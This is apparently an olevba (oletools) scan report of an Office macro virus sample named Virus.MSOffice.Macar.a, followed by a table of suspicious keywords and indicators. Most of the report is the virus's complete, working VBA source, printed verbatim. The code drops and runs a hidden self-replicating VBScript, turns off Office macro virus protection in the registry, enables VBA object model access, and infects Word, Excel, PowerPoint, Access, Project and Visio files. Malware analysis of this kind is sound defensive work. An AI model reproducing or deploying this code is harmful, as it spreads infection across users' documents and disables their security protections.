olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Macar.a-f3a90188d77b2593d50a842676753cc2b3872e17
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Macar.a-f3a90188d77b2593d50a842676753cc2b3872e17 
in file: Virus.MSOffice.Macar.a-f3a90188d77b2593d50a842676753cc2b3872e17 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub p_open()
Open "m.vbs" For Output As #1: a = Chr(34): b = vbCrLf: c = "sig=" + a + "Macaroni - roy g biv 05/02/05" + a + ":a=array(" + a + "doc" + a + "," + a + "xls" + a + "," + a + "ppt" + a + "," + a + "mdb" + a + "," + a + "mpp" + a + "," + a + "vsd" + a + "," + a + "vbs" + a + "):b=array(" + a + "Word" + a + "," + a + "Excel" + a + "," + a + "PowerPoint" + a + "," + a + "Access" + a + "," + a + "Project" + a + "," + a + "Visio" + a + "):c=array(" + a + "Document" + a + "," + a + "WorkBook" + a + "," + a + "p" + a + "," + a + "d" + a + ",b(4)," + a + "Document" + a + "," + a + "Macaroni" + a + "):y=" + a + "byval z as " + a + ":dim d(6):d(4)=y+b(4):d(5)=y+" + a + "iv" + a + "+c(0):on error resume next:e=" + a + "sig=" + a + ":set f=createobject(" + a + "scripting.filesystemobject" + a + "):g=f.opentextfile(wscript.scriptfullname).readall:g=mid(g,instr(g,e)):g=left(g,instr(g," + a + "'" + a + "+" + a + "'" + a + ")+1):randomize:h=int(rnd*7):i=" + a + "This" + a + "+c(h):j=chr(34):k=j+" + a + "m.vbs" + _
a + "+j:l=vbcrlf:m=l+" + a + "open " + a + "+k+" + a + " for output as #1: a = chr(34): b = vbcrlf: c = " + a + "+j+replace(g,j,j+" + a + " + a + " + a + "+j)+j+l:n=1:do:o=1017:p=mid(m,n,o):q=0:r=1:do:q=q+1:r=instr(r,p,j)+1:loop while r>1:r=" + a + "" + a + ":q=q mod 2:if q=0then r=j:else s=instrrev(p,j):t=instrrev(p," + a + " " + a + "):if s<t then s=t:end if:p=left(p,s):o=s:end if:m=left(m,n-1)+p+r+" + a + "+ _" + a + "+l+r+mid(m,n+o):n=n+o-q+6:loop while o>0:m=left(m,len(m)-12)+l+" + a + "print #1,c:close #1:createobject(" + a + "+j+" + a + "wscript.shell" + a + "+j+" + a + ").run" + a + "+k+" + a + ",0" + a + "+l:if h=2then m=m+" + a + "activepresentation.slideshowwindow.view.next" + a + "+l:end if:set n=createobject(" + a + "wscript.shell" + a + "):o=" + a + "HKCU\software\microsoft\" + a + ":p=o+" + a + "office\8.0\" + a + ":q=" + a + "REG_SZ" + a + ":n.regwrite p+" + a + "Word\Options\EnableMacroVirusProtection" + a + ",0,q:n.regwrite p+" + a + "MS Project\Options\General\Macro Virus Protection" + _
 a + "," + a + "No" + a + ",q:q=" + a + "REG_DWORD" + a + ":n.regwrite p+" + a + "Excel\Microsoft Excel\Options6" + a + ",0,q:n.regwrite p+" + a + "PowerPoint\Options\MacroVirusProtection" + a + ",0,q:p=b(h):if h=4then p=" + a + "MS " + a + "+p:end if:if h<>6then for r=9to 12:s=o:if h<>5then s=s+" + a + "Office\" + a + "+cstr(r)+" + a + ".0\" + a + ":end if:s=s+p+" + a + "\Security\" + a + ":n.regwrite s+" + a + "Level" + a + ",1,q:n.regwrite s+" + a + "AccessVBOM" + a + ",1,q:next:end if:set n=f.getfolder(" + a + "." + a + "):for each o in n.files:if lcase(f.getextensionname(o))=a(h)then o=o.path:err=0:set q=f.opentextfile(o,8):if err.number=0then r=" + a + "sub " + a + ":if h=6then if instr(f.opentextfile(o).readall,e)=0then q.write l+c(6)+l+r+c(6)+l+g+l+" + a + "end " + a + "+r:end if:else err=0:if h=5then set q=createobject(p+" + a + ".invisibleapp" + a + "):else if h=4then p=" + a + "MS" + a + "+b(h):end if:set q=createobject(p+" + a + ".application" + a + "):end if:if err.number=0then q.visible" + _
"=0:q.application.automationsecurity=1:set s=q.documents:set s=q.workbooks:set s=q.presentations:err=0:if h=3then q.opencurrentdatabase(o):else if h=4then q.fileopen(o):set s=q.activeproject:else if h=2then q.visible=1:end if:set s=s.open(o):end if:end if:if err.number=0then set o=q.vbe.activevbproject.vbcomponents(i).codemodule:set o=s.vbproject.vbcomponents(i).codemodule:t=" + a + "_open" + a + ":if h=5then t=" + a + "_" + a + "+c(0)+" + a + "opened" + a + ":end if:t=c(h)+t:err=0:o=o.proccountlines(t,0):if err.number>0then if h=2then s.vbproject.vbcomponents.add(1).name=i:end if:if h=3then with q.vbe.activevbproject:.vbcomponents.add(1).name=i:set o=.vbcomponents(i).codemodule:end with:end if:set o=s.vbproject.vbcomponents(i).codemodule:s=" + a + "private " + a + ":if h=2or h=3then s=" + a + "" + a + ":if h=3then r=" + a + "function " + a + ":end if:end if:o.addfromstring(s+r+t+" + a + "(" + a + "+d(h)+" + a + ")" + a + "+m+" + a + "end " + a + "+r):if h=2then with q.activepresentation:with .slidemas" + _
"ter:set o=.shapes.addshape(1,0,0,.width,.height):end with:o.fill.transparency=1:with o.actionsettings(1):.action=8:.run=t:end with:.save:.close:end with:else if h=3then q.docmd.openform q.currentproject.allforms(0).name,1:q.forms(0).onopen=" + a + "=" + a + "+t+" + a + "()" + a + ":q.docmd.save 5,i:end if:q.activedocument.save:q.activeworkbook.save:q.filesave:q.fileclose:end if:end if:end if:if h<>2and h<>4then q.quit:end if:end if:end if:end if:end if:next''"
Print #1, c: Close #1: CreateObject("wscript.shell").Run "m.vbs", 0
ActivePresentation.SlideShowWindow.View.Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|print #             |May write to a file (if combined with Open)  |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|createobject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |m.vbs               |Executable file name                         |
|IOC       |q.vbe               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

